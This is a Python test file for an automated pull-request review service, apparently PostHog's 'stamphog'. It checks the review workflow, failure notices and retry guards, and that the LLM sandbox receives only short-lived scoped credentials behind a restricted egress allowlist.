import os
import json
import uuid
from pathlib import Path

import pytest
from unittest.mock import MagicMock, patch

from django.test import override_settings
from django.utils import timezone

import requests

from posthog.egress.github.transport import GitHubRateLimitError
from posthog.models import OAuthAccessToken, Team
from posthog.models.instance_setting import override_instance_config
from posthog.models.integration import Integration

from products.signals.backend.models import SignalReport
from products.stamphog.backend.facade.enums import (
    AudienceReason,
    ChannelResolutionSource,
    DigestRunStatus,
    ReviewMode,
    ReviewRunStatus,
    ReviewVerdict,
)
from products.stamphog.backend.logic.channel_resolution import (
    RoutingContext,
    build_routing_context,
    resolve_destination,
)
from products.stamphog.backend.logic.github_client import STICKY_COMMENT_MARKER, StamphogGitHubClient
from products.stamphog.backend.logic.slack_digest import _THREAD_LEAD
from products.stamphog.backend.models import DigestRun, PullRequest, PullRequestAudience, ReviewRun, StamphogRepoConfig
from products.stamphog.backend.tasks.digest import send_daily_digests
from products.stamphog.backend.tasks.tasks import process_inbox_pr_review
from products.stamphog.backend.temporal import activities
from products.stamphog.backend.temporal.activities import (
    MarkReviewFailedInput,
    StamphogReviewInput,
    dismiss_stale_approvals,
    fetch_review_context,
    list_in_flight_reviewer_bots,
    mark_review_failed,
    post_verdict,
    run_review_in_sandbox,
)
from products.stamphog.backend.temporal.constants import (
    STAMPHOG_SANDBOX_CONTEXT_PATH,
    STAMPHOG_SANDBOX_REPO_DIR,
    SandboxPhaseError,
)
from products.stamphog.backend.tests import fakes
from products.stamphog.backend.tests.conftest import PRODUCT_DATABASES, StamphogChain, _run_activity
from products.tasks.backend.models import Task, TaskRun

REPO = "acme/widgets"
INSTALLATION_ID = "2001"
BASE_SHA = "base000"
POLICY_DEFAULTS_DIR = Path(__file__).resolve().parents[1] / "logic" / "policy_defaults"


def _repo_config(team_id: int, *, digest_enabled: bool = True, repository: str = REPO) -> StamphogRepoConfig:
    # Reviews mint the sandbox gateway token under the connecting user, so wire the team's own
    # member in — exactly what sync_installation records in production.
    connected_by = Team.objects.get(id=team_id).organization.members.values_list("id", flat=True).first()
    return StamphogRepoConfig.objects.for_team(team_id).create(
        team_id=team_id,
        repository=repository,
        installation_id=INSTALLATION_ID,
        enabled=True,
        digest_enabled=digest_enabled,
        connected_by_user_id=connected_by,
    )


def _pr_object(number: int, author: str, head_sha: str) -> dict:
    return {
        "number": number,
        "title": f"PR {number}",
        "body": "Adds a small helper and a test.",
        "html_url": f"https://github.com/{REPO}/pull/{number}",
        "user": {"login": author},
        "head": {"sha": head_sha, "ref": f"feat/pr-{number}"},
        "base": {"sha": BASE_SHA, "ref": "master"},
        "draft": False,
    }


def _pr_files() -> list[dict]:
    return [{"filename": "src/util.py", "status": "modified", "additions": 8, "deletions": 1, "patch": "@@ -1 +1 @@"}]


def _opened_event(number: int, author: str, head_sha: str) -> dict:
    return fakes.build_pull_request_event(
        action="opened",
        installation_id=INSTALLATION_ID,
        repo=REPO,
        number=number,
        title=f"PR {number}",
        body="Adds a small helper and a test.",
        author_login=author,
        head_sha=head_sha,
        head_ref=f"feat/pr-{number}",
        base_sha=BASE_SHA,
    )


def _synchronize_event(number: int, author: str, head_sha: str) -> dict:
    return fakes.build_pull_request_event(
        action="synchronize",
        installation_id=INSTALLATION_ID,
        repo=REPO,
        number=number,
        title=f"PR {number}",
        body="Adds a small helper and a test.",
        author_login=author,
        head_sha=head_sha,
        head_ref=f"feat/pr-{number}",
        base_sha=BASE_SHA,
    )


def _merged_event(number: int, author: str, head_sha: str) -> dict:
    return fakes.build_pull_request_event(
        action="closed",
        installation_id=INSTALLATION_ID,
        repo=REPO,
        number=number,
        title=f"PR {number}",
        body="Adds a small helper and a test.",
        author_login=author,
        head_sha=head_sha,
        head_ref=f"feat/pr-{number}",
        base_sha=BASE_SHA,
        merged=True,
        # Recent, not a fixed date: send_daily_digests bounds a channel's first digest to the previous
        # weekday slot, so a hardcoded merged_at silently ages out of the claim window as the calendar
        # moves and the digest stops posting. now() keeps the merged PR inside the window on any run day.
        merged_at=timezone.now().isoformat(),
        merge_commit_sha=f"merge{number}",
        additions=8,
        deletions=1,
        changed_files=1,
    )


def _make_pr_with_review(
    team_id: int,
    repo_config: StamphogRepoConfig,
    *,
    number: int,
    author: str,
    approved_at_sha: str | None,
    owning_team: str = "team-devex",
) -> PullRequest:
    pull_request = PullRequest.objects.for_team(team_id).create(
        team_id=team_id,
        repo_config=repo_config,
        pr_number=number,
        author_login=author,
        pr_url=f"https://github.com/{REPO}/pull/{number}",
        head_branch=f"feat/pr-{number}",
    )
    if approved_at_sha is not None:
        ReviewRun.objects.for_team(team_id).create(
            team_id=team_id,
            pull_request=pull_request,
            head_sha=approved_at_sha,
            status=ReviewRunStatus.COMPLETED,
            verdict=ReviewVerdict.APPROVED,
            # Digest audiences are read back out of the approving run's ownership, so a run without
            # one produces no audience at all and cannot exercise the eligibility gate.
            gate_result={"classification": {"ownership": {"teams": [f"@PostHog/{owning_team}"]}}},
        )
    return pull_request


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_signed_webhook_drives_review_and_posts_approval(team, stamphog_chain: StamphogChain) -> None:
    # Regression guard: the webhook -> capture -> review -> post chain wiring. A signed opened
    # delivery must create the PR + ReviewRun, run the review activities, and post an APPROVE
    # review to GitHub pinned to the reviewed head SHA.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    author, head_sha = "devex-dev", "sha101a"
    recorder.register_pr(REPO, 101, _pr_object(101, author, head_sha), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"

    status = stamphog_chain.post_webhook(_opened_event(101, author, head_sha), delivery_id=str(uuid.uuid4()))
    assert status == 202

    pr = PullRequest.objects.for_team(team.id).get(repo_config=repo_config, pr_number=101)
    run = ReviewRun.objects.for_team(team.id).filter(pull_request=pr).latest("created_at")
    assert run.status == ReviewRunStatus.COMPLETED
    assert run.verdict == ReviewVerdict.APPROVED

    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
    assert len(approvals) == 1
    assert approvals[0]["body"]["event"] == "APPROVE"
    assert approvals[0]["body"]["commit_id"] == head_sha

    # signal_review_started posts a "review in flight" 👀 right after the stale-approval sweep, and
    # post_verdict removes it once the verdict lands — the same reaction, added once and removed once.
    additions = [w for w in recorder.github_writes if w["kind"] == "add_reaction"]
    removals = [w for w in recorder.github_writes if w["kind"] == "remove_reaction"]
    assert len(additions) == 1
    assert [r["reaction_id"] for r in removals] == [additions[0]["id"]]

    # An APPROVED verdict never hands off to ReviewHog — the reviewhog label is a refusal-only signal.
    assert [w for w in recorder.github_writes if w["kind"] == "add_label"] == []


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_sandbox_destroy_failure_does_not_mask_a_completed_review(team, stamphog_chain: StamphogChain) -> None:
    # Teardown runs in a finally block after a successful review; if its exception propagated it
    # would replace the success, drop the verdict, and mark the run FAILED.
    _repo_config(team.id)
    recorder = stamphog_chain.recorder
    author, head_sha = "devex-dev", "sha109a"
    recorder.register_pr(REPO, 109, _pr_object(109, author, head_sha), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"
    stamphog_chain.sandbox_class.destroy_error = RuntimeError("sandbox teardown blew up")

    status = stamphog_chain.post_webhook(_opened_event(109, author, head_sha), delivery_id=str(uuid.uuid4()))
    assert status == 202

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.COMPLETED
    assert run.verdict == ReviewVerdict.APPROVED
    assert any(w["kind"] == "approve_review" for w in recorder.github_writes)


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_failure_once_the_sandbox_exists_is_not_retried(team, stamphog_chain: StamphogChain) -> None:
    # Provisioning the box is the first paid step, so a failure from there on must reach Temporal as
    # SandboxPhaseError. Without the marker SANDBOX_RETRY_POLICY would run the reviewer agent again
    # and bill a second time for one review.
    _repo_config(team.id)
    recorder = stamphog_chain.recorder
    author, head_sha = "devex-dev", "sha110a"
    recorder.register_pr(REPO, 110, _pr_object(110, author, head_sha), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"
    stamphog_chain.sandbox_class.create_error = RuntimeError("modal refused the box")

    status = stamphog_chain.post_webhook(_opened_event(110, author, head_sha), delivery_id=str(uuid.uuid4()))
    assert status == 202

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.FAILED
    # The record names the marker and the type, and nothing from the sandbox. Anyone with
    # stamphog:read can read run.error, and this phase reads an untrusted PR head.
    assert run.error == "SandboxPhaseError: the sandbox phase failed with RuntimeError"
    assert "modal refused the box" not in (run.error or "")


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_a_second_attempt_never_provisions_a_second_sandbox(team, stamphog_chain: StamphogChain) -> None:
    # Temporal enforces the start-to-close timeout itself and retries a lost worker, and neither path
    # raises anything the SandboxPhaseError marker can catch. Only the run-level stamp stops such a
    # retry from provisioning a second box and billing a second reviewer agent.
    _repo_config(team.id)
    recorder = stamphog_chain.recorder
    author, head_sha = "devex-dev", "sha111a"
    recorder.register_pr(REPO, 111, _pr_object(111, author, head_sha), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"
    stamphog_chain.sandbox_class.create_error = RuntimeError("modal refused the box")

    stamphog_chain.post_webhook(_opened_event(111, author, head_sha), delivery_id=str(uuid.uuid4()))
    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert len(stamphog_chain.sandbox_class.created_configs) == 1

    # Clearing the scripted failure is what makes this prove the stamp: a second attempt would
    # otherwise provision successfully and run the reviewer again.
    stamphog_chain.sandbox_class.create_error = None
    with pytest.raises(SandboxPhaseError):
        _run_activity(run_review_in_sandbox, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))
    assert len(stamphog_chain.sandbox_class.created_configs) == 1


def test_malformed_repo_policy_keeps_the_parser_text_out_of_the_error() -> None:
    # PyYAML names the bad tag on its first line, and run.error keeps that line. Anyone with
    # stamphog:read can read it without access to the repository the policy file comes from.
    with pytest.raises(RuntimeError) as raised:
        activities._overlay_policy_yaml("acme/widgets", "version: 1\n", "!a-private-internal-tag {}\n")

    assert "a-private-internal-tag" not in str(raised.value)
    assert ".stamphog/policy.yml" in str(raised.value)


@pytest.mark.parametrize(
    "review_mode,self_driving",
    [(ReviewMode.LABEL, False), (ReviewMode.ALL, False), (ReviewMode.LABEL, True)],
    ids=["label_mode", "all_mode", "self_driving"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_a_failed_run_says_so_on_the_pull_request(
    team, stamphog_chain: StamphogChain, review_mode: ReviewMode, self_driving: bool
) -> None:
    # A failure keeps the trigger label, so the per-PR cooldown rejects a re-added one and a
    # self-driving run ignores labels. A push is the only route that starts a run in every mode.
    repo_config = _repo_config(team.id)
    repo_config.review_mode = review_mode
    repo_config.save()
    head_sha = "sha-failed"
    stamphog_chain.recorder.register_pr(REPO, 114, _pr_object(114, "devex-dev", head_sha))
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=114, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"inbox_review": True} if self_driving else {},
    )

    _run_activity(
        mark_review_failed,
        MarkReviewFailedInput(str(run.id), team.id, "SandboxPhaseError: modal refused the box"),
    )

    notices = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "comment_review"]
    assert len(notices) == 1
    body = notices[0]["body"]["body"]
    assert body.startswith("**The review did not complete.**")
    assert "Push a new commit to try again." in body
    assert "label" not in body  # the cooldown makes a relabel the one route that can do nothing
    # The cause belongs on the run and in the worker logs, never on a public pull request.
    assert "modal refused the box" not in body


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_a_superseded_run_posts_no_failure_notice(team, stamphog_chain: StamphogChain) -> None:
    # A superseded run must stay quiet: its replacement holds the same head. Two guards give that,
    # the terminal-status return this case reaches and the marked_failed gate. Driving the race
    # between them needs a mocked load, so this pins the outcome they share.
    repo_config = _repo_config(team.id)
    head_sha = "sha-superseded"
    stamphog_chain.recorder.register_pr(REPO, 115, _pr_object(115, "devex-dev", head_sha))
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=115, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha=head_sha, status=ReviewRunStatus.SUPERSEDED
    )

    _run_activity(mark_review_failed, MarkReviewFailedInput(str(run.id), team.id, "RuntimeError: worker lost"))

    run.refresh_from_db()
    assert run.status == ReviewRunStatus.SUPERSEDED  # the terminal guard held
    assert [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "comment_review"] == []


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_no_failure_notice_once_a_newer_run_holds_the_same_head(team, stamphog_chain: StamphogChain) -> None:
    # `reopened` does not move the head, and supersession skips terminal states, so a replacement
    # can hold the same head. That replacement can approve the commit this notice calls unreviewed.
    repo_config = _repo_config(team.id)
    head_sha = "sha-reopened"
    stamphog_chain.recorder.register_pr(REPO, 118, _pr_object(118, "devex-dev", head_sha))
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=118, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha=head_sha, status=ReviewRunStatus.REVIEWING
    )
    ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha=head_sha, status=ReviewRunStatus.QUEUED
    )

    _run_activity(mark_review_failed, MarkReviewFailedInput(str(run.id), team.id, "RuntimeError: worker lost"))

    run.refresh_from_db()
    assert run.status == ReviewRunStatus.FAILED  # the run still records its own outcome
    assert [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "comment_review"] == []


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_a_notice_github_error_fails_the_activity_so_temporal_retries(team, stamphog_chain: StamphogChain) -> None:
    # A hidden error completes the activity, so Temporal does not retry and the PR keeps no notice.
    # A rate limit does this. The FAILED update is committed, so raising cannot undo it.
    repo_config = _repo_config(team.id)
    head_sha = "sha-notice-error"
    stamphog_chain.recorder.register_pr(REPO, 117, _pr_object(117, "devex-dev", head_sha))
    stamphog_chain.recorder.comment_review_side_effect = GitHubRateLimitError("secondary rate limit")
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=117, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha=head_sha, status=ReviewRunStatus.REVIEWING
    )

    with pytest.raises(GitHubRateLimitError):
        _run_activity(mark_review_failed, MarkReviewFailedInput(str(run.id), team.id, "RuntimeError: worker lost"))

    run.refresh_from_db()
    assert run.status == ReviewRunStatus.FAILED  # committed before the post, so the raise leaves it


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_a_retry_finishes_a_notice_the_previous_attempt_never_posted(team, stamphog_chain: StamphogChain) -> None:
    # The activity marks the run FAILED, removes its reaction, sweeps GitHub, then posts. An attempt
    # that dies in that window leaves a FAILED run with no notice, and the retry finds it terminal.
    repo_config = _repo_config(team.id)
    head_sha = "sha-resumed"
    stamphog_chain.recorder.register_pr(REPO, 116, _pr_object(116, "devex-dev", head_sha))
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=116, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha=head_sha, status=ReviewRunStatus.FAILED
    )

    _run_activity(mark_review_failed, MarkReviewFailedInput(str(run.id), team.id, "RuntimeError: worker lost"))

    notices = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "comment_review"]
    assert len(notices) == 1
    assert notices[0]["body"]["body"].startswith("**The review did not complete.**")

    # And only once: the recorded review id makes a further retry a no-op.
    _run_activity(mark_review_failed, MarkReviewFailedInput(str(run.id), team.id, "RuntimeError: worker lost"))
    assert len([w for w in stamphog_chain.recorder.github_writes if w["kind"] == "comment_review"]) == 1


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_sandbox_gets_minted_short_lived_credential_and_closed_egress(
    team, user, stamphog_chain: StamphogChain
) -> None:
    # The sandbox runs an LLM over untrusted PR content, so it must never hold a long-lived
    # credential: no raw Anthropic key, not the worker's own gateway key — only a per-run OAuth
    # token minted under the connecting user — and its egress must be fenced to the hosts a
    # review needs, so a prompt-injected reviewer has nowhere to exfiltrate to.
    _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha110a"
    recorder.register_pr(REPO, 110, _pr_object(110, "devex-dev", head_sha), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"

    worker_env = {"ANTHROPIC_API_KEY": "sk-ant-worker-secret", "AI_GATEWAY_API_KEY": "phs_worker_shared_key"}
    # The row is deleted once the sandbox is destroyed, so capture it at mint time.
    minted_rows: list[OAuthAccessToken] = []
    real_mint = activities.create_oauth_access_token_for_user

    def recording_mint(*args, **kwargs):
        minted_token = real_mint(*args, **kwargs)
        minted_rows.append(OAuthAccessToken.objects.get(token=minted_token))
        return minted_token

    with (
        patch.dict(os.environ, worker_env),
        patch.object(activities, "create_oauth_access_token_for_user", recording_mint),
    ):
        stamphog_chain.post_webhook(_opened_event(110, "devex-dev", head_sha), delivery_id=str(uuid.uuid4()))

    config = stamphog_chain.sandbox_class.created_configs[0]
    env = config.environment_variables
    assert "ANTHROPIC_API_KEY" not in env
    assert env["AI_GATEWAY_API_KEY"] != "phs_worker_shared_key"

    (minted,) = minted_rows
    assert minted.token == env["AI_GATEWAY_API_KEY"]
    assert minted.user_id == user.id
    # internal_run:read is the server-mint provenance marker the gateway's stamphog route demands
    # (requires_server_credential); llm_gateway:read is the only real capability. Anything broader
    # (task:write from the internal bundle) must never ride into the sandbox.
    assert set(minted.scope.split()) == {"llm_gateway:read", "internal_run:read"}
    assert minted.scoped_teams == [team.id]
    assert minted.expires is not None and minted.expires > timezone.now()
    # Revoked with the sandbox: the row is gone once the run ends.
    assert not OAuthAccessToken.objects.filter(token=env["AI_GATEWAY_API_KEY"]).exists()

    assert "github.com" in config.outbound_domain_allowlist
    assert "llm-gateway.test" in config.outbound_domain_allowlist
    assert "sha110a" not in config.outbound_domain_allowlist  # sanity: it's a domain list, not env spill


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_hosted_review_fails_closed_without_connecting_user(team, stamphog_chain: StamphogChain) -> None:
    # A repo whose installation was never synced has no identity to mint sandbox credentials
    # under — the run must fail, not fall back to a shared long-lived key.
    config = _repo_config(team.id)
    config.connected_by_user_id = None
    config.save(update_fields=["connected_by_user_id"])
    recorder = stamphog_chain.recorder
    recorder.register_pr(REPO, 111, _pr_object(111, "devex-dev", "sha111a"), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"

    stamphog_chain.post_webhook(_opened_event(111, "devex-dev", "sha111a"), delivery_id=str(uuid.uuid4()))

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.FAILED
    assert "connecting user" in (run.error or "")


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_failed_run_still_dismisses_the_stale_approval_first(team, stamphog_chain: StamphogChain) -> None:
    # Dismissal runs first in the workflow, so even a run that fails before reaching the sandbox
    # (here: no connecting user to mint credentials) must have already retracted the earlier head's
    # approval — a failure window must never leave a stale approval satisfying required reviews.
    repo_config = _repo_config(team.id)
    repo_config.connected_by_user_id = None
    repo_config.save(update_fields=["connected_by_user_id"])
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=113, author_login="devex-dev"
    )
    prior = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha="sha-old",
        status=ReviewRunStatus.COMPLETED,
        verdict=ReviewVerdict.APPROVED,
        posted_review_id=777,
    )
    recorder = stamphog_chain.recorder
    recorder.register_pr(REPO, 113, _pr_object(113, "devex-dev", "sha113b"), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"

    stamphog_chain.post_webhook(_synchronize_event(113, "devex-dev", "sha113b"), delivery_id=str(uuid.uuid4()))

    current = ReviewRun.objects.for_team(team.id).filter(pull_request=pull_request).latest("created_at")
    assert current.status == ReviewRunStatus.FAILED
    prior.refresh_from_db()
    assert prior.approval_dismissed_at is not None
    dismissals = [w for w in recorder.github_writes if w["kind"] == "dismiss_review"]
    assert [w["review_id"] for w in dismissals] == [777]


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_signal_review_started_posts_eyes_and_persists_reaction_id(team, stamphog_chain: StamphogChain) -> None:
    # The moment a run commits to reviewing, it should show the same "review in flight" 👀 signal
    # STAMPHOG_TRUSTED_REACTOR_BOTS reads off other reviewer bots — and the reaction id must be
    # persisted so the terminal activities can find and remove it again.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=141, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha="sha141a", status=ReviewRunStatus.QUEUED
    )

    _run_activity(activities.signal_review_started, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    additions = [w for w in recorder.github_writes if w["kind"] == "add_reaction"]
    assert len(additions) == 1
    assert additions[0]["content"] == "eyes"
    run.refresh_from_db()
    assert run.output["own_eyes_reaction_id"] == additions[0]["id"]


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_signal_review_started_reaction_failure_does_not_fail_the_activity(team, stamphog_chain: StamphogChain) -> None:
    # add_pr_reaction is deliberately the one fail-open call on this client (see its docstring): a
    # GitHub hiccup posting the cosmetic 👀 must never fail or retry the review run itself.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    recorder.reaction_response_override = fakes.FakeResponse(500, text="rate limited")
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=142, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha="sha142a", status=ReviewRunStatus.QUEUED
    )

    result = _run_activity(
        activities.signal_review_started, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id)
    )

    assert result == {"reaction_id": None}
    run.refresh_from_db()
    assert run.output["own_eyes_reaction_id"] is None
    assert run.status == ReviewRunStatus.QUEUED  # the activity neither raised nor marked the run failed


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_hosted_review_fails_closed_without_gateway_instead_of_anthropic_fallback(
    team, stamphog_chain: StamphogChain
) -> None:
    # With no gateway configured the run must fail — never ship the org-wide Anthropic key from
    # the worker env into the sandbox as a fallback.
    _repo_config(team.id)
    recorder = stamphog_chain.recorder
    recorder.register_pr(REPO, 112, _pr_object(112, "devex-dev", "sha112a"), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"

    with (
        override_settings(AI_GATEWAY_URL="", AI_GATEWAY_API_KEY=""),
        patch.dict(os.environ, {"ANTHROPIC_API_KEY": "sk-ant-worker-secret"}),
    ):
        stamphog_chain.post_webhook(_opened_event(112, "devex-dev", "sha112a"), delivery_id=str(uuid.uuid4()))

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.FAILED
    assert "gateway" in (run.error or "").lower()
    assert not stamphog_chain.sandbox_class.created_configs  # no sandbox was ever provisioned
    # Nothing was paid for, so this failure must stay retryable: SANDBOX_RETRY_POLICY gives another
    # attempt to every type except SandboxPhaseError.
    assert not (run.error or "").startswith("SandboxPhaseError")


_GO_GATEWAY_SETTINGS = {"AI_GATEWAY_URL": "https://ai-gateway.test/v1", "AI_GATEWAY_API_KEY": "phs_stamphog_mint"}


def _mint_response(status_code: int, payload: dict | None = None, text: str = "") -> MagicMock:
    response = MagicMock()
    response.status_code = status_code
    response.json.return_value = payload if payload is not None else {}
    response.text = text
    return response


def _register_review(stamphog_chain: StamphogChain, number: int, head_sha: str) -> dict:
    recorder = stamphog_chain.recorder
    recorder.register_pr(REPO, number, _pr_object(number, "devex-dev", head_sha), _pr_files())
    recorder.policy_files[".stamphog/policy.yml"] = "version: 1\n"
    return _opened_event(number, "devex-dev", head_sha)


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_sandbox_gets_a_scoped_gateway_token_when_the_go_gateway_is_configured(
    team, user, stamphog_chain: StamphogChain
) -> None:
    # With the Go ai-gateway configured, the sandbox credential is a per-run phe_ minted with the
    # worker's phs_ and pinned to the stamphog product and the customer team. The phs_ never enters
    # the sandbox, no OAuth token is minted, and egress follows the URL the sandbox was handed.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 113, "sha113a")
    minted = {"token": "phe_run", "expires_at": "2026-09-02T00:00:00Z", "cap_usd": "5"}
    mint = MagicMock(return_value=_mint_response(201, minted))

    with (
        override_settings(**_GO_GATEWAY_SETTINGS),
        patch.dict(os.environ, {"ANTHROPIC_API_KEY": "sk-ant-worker-secret"}),
        patch.object(activities.requests, "post", mint),
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    config = stamphog_chain.sandbox_class.created_configs[0]
    env = config.environment_variables
    assert env["AI_GATEWAY_URL"] == "https://ai-gateway.test/v1"
    assert env["AI_GATEWAY_API_KEY"] == "phe_run"
    # Nothing long-lived crosses into the sandbox: not the worker's phs_, not an Anthropic key, and
    # no key outside the documented set (a widened passthrough goes red here).
    assert "phs_stamphog_mint" not in env.values()
    assert "ANTHROPIC_API_KEY" not in env
    assert set(env) <= {
        "STAMPHOG_REPO_DIR",
        "AI_GATEWAY_URL",
        "AI_GATEWAY_API_KEY",
        "POSTHOG_API_KEY",
        "POSTHOG_HOST",
        "STAMPHOG_EXTRA_PROPERTIES",
    }
    assert not OAuthAccessToken.objects.filter(user_id=user.id).exists()

    mint_call, revoke_call = mint.call_args_list
    assert mint_call.args == ("https://ai-gateway.test/v1/tokens",)
    assert mint_call.kwargs["headers"] == {"Authorization": "Bearer phs_stamphog_mint"}
    assert mint_call.kwargs["timeout"] == 3
    assert user.distinct_id  # the acting identity rides on the token
    assert mint_call.kwargs["json"] == {
        "cap_usd": "5",
        "ttl_seconds": 3600,
        "product": "aio_stamphog",
        "obo": str(team.id),
        "user": user.distinct_id,
    }
    # The token dies with its sandbox: a best-effort revoke follows destroy.
    assert revoke_call.args == ("https://ai-gateway.test/v1/tokens/revoke",)
    assert revoke_call.kwargs["json"] == {"token": "phe_run"}
    assert revoke_call.kwargs["headers"] == {"Authorization": "Bearer phs_stamphog_mint"}
    assert "ai-gateway.test" in config.outbound_domain_allowlist
    assert "github.com" in config.outbound_domain_allowlist
    assert "llm-gateway.test" not in config.outbound_domain_allowlist


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_hosted_review_fails_closed_when_the_scoped_token_mint_fails(team, stamphog_chain: StamphogChain) -> None:
    # A mint outage retries once and then fails the run: no sandbox, never a shared-key fallback.
    # Nothing was paid for, so the failure stays retryable (not SandboxPhaseError).
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 114, "sha114a")
    mint = MagicMock(return_value=_mint_response(503, text="upstream unavailable"))

    with (
        override_settings(**_GO_GATEWAY_SETTINGS),
        patch.object(activities.requests, "post", mint),
        patch.object(activities.time, "sleep"),
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.FAILED
    assert "gateway" in (run.error or "").lower()
    assert "HTTP 503" in (run.error or "")
    assert mint.call_count == 2
    assert not stamphog_chain.sandbox_class.created_configs
    assert not (run.error or "").startswith("SandboxPhaseError")


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_scoped_token_mint_does_not_retry_a_credential_rejection(team, stamphog_chain: StamphogChain) -> None:
    # A 4xx other than 429 is a final answer about the worker's own credential; retrying it only
    # burns the mint quota. The gateway's reason survives into run.error for the operator.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 115, "sha115a")
    refusal = '{"error":"only a standard credential may mint scoped tokens"}'
    mint = MagicMock(return_value=_mint_response(403, text=refusal))

    with override_settings(**_GO_GATEWAY_SETTINGS), patch.object(activities.requests, "post", mint):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.FAILED
    assert "HTTP 403" in (run.error or "")
    assert "only a standard credential" in (run.error or "")
    assert mint.call_count == 1
    assert not stamphog_chain.sandbox_class.created_configs


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_a_half_configured_go_gateway_keeps_the_oauth_path(team, stamphog_chain: StamphogChain) -> None:
    # The keyless shape: AI_GATEWAY_URL on the legacy stamphog route, no AI_GATEWAY_API_KEY. The worker
    # mints OAuth tokens for that route and never calls the mint API.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 116, "sha116a")
    mint = MagicMock()

    with (
        override_settings(AI_GATEWAY_URL="https://llm-gateway.test/stamphog/v1", AI_GATEWAY_API_KEY=""),
        patch.object(activities.requests, "post", mint),
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    config = stamphog_chain.sandbox_class.created_configs[0]
    env = config.environment_variables
    assert env["AI_GATEWAY_URL"] == "https://llm-gateway.test/stamphog/v1"
